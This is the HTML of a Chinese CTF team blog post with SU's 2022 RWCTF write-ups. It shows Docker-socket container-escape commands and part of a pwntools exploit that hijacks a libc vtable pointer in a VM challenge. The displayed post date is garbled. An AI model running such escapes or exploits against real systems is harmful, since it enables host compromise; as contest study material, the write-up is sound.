@@ -1,0 +1,1631 @@
+<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>2022 RWCTF体验赛 SU Writeup -</title><meta name=description content="本次2022 RWCTF 体验赛 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)
+以下是我们 SU 本次 2022 RWCTF的 writeup 以及RWCTF RWDN 复现解析"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/rwctf-2022-su-wu\/","name":"2022 rwctf体验赛 su writeup"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"2022 RWCTF体验赛 SU Writeup","description":"本次2022 RWCTF 体验赛 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770) 以下是我们 SU 本次 2022 RWCTF的 writeup 以及RWCTF RWDN 复现解析\n","inLanguage":"en","wordCount":4028,"datePublished":"2022-01-30T16:50:17\u002b00:00","dateModified":"2022-01-30T16:50:17\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["RWCTF"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/rwctf-2022-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="2022 RWCTF体验赛 SU Writeup"><meta property="og:description" content="本次2022 RWCTF 体验赛 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)
+以下是我们 SU 本次 2022 RWCTF的 writeup 以及RWCTF RWDN 复现解析"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/rwctf-2022-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="2022 RWCTF体验赛 SU Writeup"><meta name=twitter:description content="本次2022 RWCTF 体验赛 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)
+以下是我们 SU 本次 2022 RWCTF的 writeup 以及RWCTF RWDN 复现解析"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href=https://su-team.cn/css/codeblock.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
+<span class=sr-only>Toggle navigation</span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
+<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
+<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
+<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>2022 RWCTF体验赛 SU Writeup</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on January 30, 300117
+&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;19&nbsp;min
+&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;4028&nbsp;words
+&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><a href=#pwn>pwn</a><ul><li><ul><li><a href=#remote-debug-server>Remote-debug-Server</a></li><li><a href=#be-a-docker-escaper>Be-a-Docker-Escaper</a></li><li><a href=#be-a-vm-escaper>Be-a-VM-Escaper</a></li><li><a href=#phonograph>Phonograph</a></li></ul></li></ul></li><li><a href=#web>WEB</a></li><li><a href=#realworld-ctf-2022---rwdn-复现解析>Realworld CTF 2022 - RWDN 复现解析</a><ul><li><a href=#前情提要>前情提要</a></li><li><a href=#拿到题目>拿到题目</a><ul><li><a href=#source-审计>source 审计</a></li><li><a href=#check-审计>check 审计</a></li><li><a href=#看一眼-31338-端口>看一眼 31338 端口</a></li></ul></li><li><a href=#思路和利用>思路和利用</a><ul><li><a href=#第一部分>第一部分</a><ul><li><a href=#errordocument>ErrorDocument</a></li><li><a href=#上传文件>上传文件</a></li></ul></li><li><a href=#第二部分>第二部分</a><ul><li><a href=#apache2conf审计>apache2.conf审计</a></li></ul></li><li><a href=#htaccess-滥用-挂载-ld_perload>htaccess 滥用 挂载 LD_PERLOAD</a></li></ul></li><li><a href=#最后-getshell-readflag>最后 Getshell readflag</a></li><li><a href=#wrap-up>Wrap up</a></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>本次2022 RWCTF 体验赛 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href=mailto:suers_xctf@126.com>suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)
+以下是我们 SU 本次 2022 RWCTF的 writeup 以及RWCTF RWDN 复现解析</p><p><img src=/img/2022-1-22-RWCTF/1.png alt></p><h1 id=pwn>pwn</h1><h3 id=remote-debug-server>Remote-debug-Server</h3><p>直接 remote get /flag flag</p><h3 id=be-a-docker-escaper>Be-a-Docker-Escaper</h3><p>docker逃逸,参考 <a href=https://www.anquanke.com/post/id/179623#h2-3>这篇文章</a> 发现题目提供的dockerfile中有 <code>docker run -i -m 128m -v /var/run/docker.sock:/s ubuntu # You are here!</code>这一行 将docker.sock映射到docker中的/s目录下,因此和文章中一样操作即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>apt update
+</span></span><span class=line><span class=cl>apt install docker.io
+</span></span><span class=line><span class=cl>mkdir /aa
+</span></span><span class=line><span class=cl>docker -H unix:///s/docker.sock run -v /:/aa -i ubuntu /bin/bash
+</span></span></code></pre></td></tr></table></div></div><p>Docker run命令-it的话会出现报错<code>the input device is not a TTY</code>
+搜索后发现去掉-t就行了
+之后cd /aa 即可进入映射的宿主机目录cat flag</p><h3 id=be-a-vm-escaper>Be-a-VM-Escaper</h3><p>虚拟机题目 给了源码<code>https://github.com/erratic-c-programmer/lvm</code>
+审源码的时候发现栈的检测很严格,但是reg寄存器数组没有检测负溢出.
+同时reg的索引是longlong类型,可以负溢出修改低地址的内容
+动态调试发现reg数组低地址的局部变量只有<code>cinstr</code>即rip的内容,因此无法动态修改虚拟机的栈和代码.
+通过负索引获取栈地址和libc地址,通过sub命令算出偏移,然后通过修改rip使vm跳转到布置好的代码处写printf函数调用的<code>io_file_jumps</code>vtable中的_IO_xputs函数指针为one_gadget即可.
+布置代码我的选择是正常写在reg数组中,reg数组可以写三条指令,刚好够load + store + print</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;DEBUG&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1># sh = process(&#39;./lvm&#39;)</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;101.132.235.138&#34;</span><span class=p>,</span><span class=mi>1337</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc-2.31.so&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>len</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>push</span><span class=p>(</span><span class=n>num</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nb>len</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span><span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=n>num</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>len</span> <span class=o>+=</span><span class=mi>1</span> 
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>payload</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>store</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nb>len</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span><span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>len</span> <span class=o>+=</span><span class=mi>1</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>payload</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>load</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nb>len</span>
+</span></span><span class=line><span class=cl>    <span class=nb>len</span> <span class=o>+=</span><span class=mi>1</span> 
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span><span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>payload</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nb>len</span>
+</span></span><span class=line><span class=cl>    <span class=nb>len</span> <span class=o>+=</span><span class=mi>1</span> 
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>str</span><span class=p>(</span><span class=mi>22</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sub</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nb>len</span>
+</span></span><span class=line><span class=cl>    <span class=nb>len</span> <span class=o>+=</span><span class=mi>1</span> 
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>str</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nb>len</span>
+</span></span><span class=line><span class=cl>    <span class=nb>len</span> <span class=o>+=</span><span class=mi>1</span> 
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>str</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>div</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nb>len</span>
+</span></span><span class=line><span class=cl>    <span class=nb>len</span> <span class=o>+=</span><span class=mi>1</span> 
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>str</span><span class=p>(</span><span class=mi>9</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>nop</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>str</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1># 0x7FFFF7EA7C7E</span>
+</span></span><span class=line><span class=cl><span class=c1># 0x7FFFF7EA7C81</span>
+</span></span><span class=line><span class=cl><span class=c1># 0x7FFFF7EA7C84</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>load</span><span class=p>(</span><span class=o>-</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>show</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>push</span><span class=p>(</span><span class=mh>0x13900</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>sub</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>store</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>load</span><span class=p>(</span><span class=o>-</span><span class=mi>35</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>show</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>push</span><span class=p>(</span><span class=mh>0x64ebf</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>sub</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>push</span><span class=p>(</span><span class=mh>0xe6c81</span><span class=p>)</span> <span class=c1># onegadget </span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>add</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>store</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>push</span><span class=p>(</span><span class=mh>0xe6c81</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>sub</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>push</span><span class=p>(</span><span class=mh>0x1ED4D8</span><span class=p>)</span> <span class=c1># xputn</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>add</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>store</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>load</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>load</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>sub</span><span class=p>()</span> 
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>push</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>div</span><span class=p>()</span> <span class=c1># off = (xputn - stack) / 8</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>store</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>push</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>store</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>push</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>store</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>push</span><span class=p>(</span><span class=mi>22</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>store</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>push</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>store</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>push</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>store</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>push</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
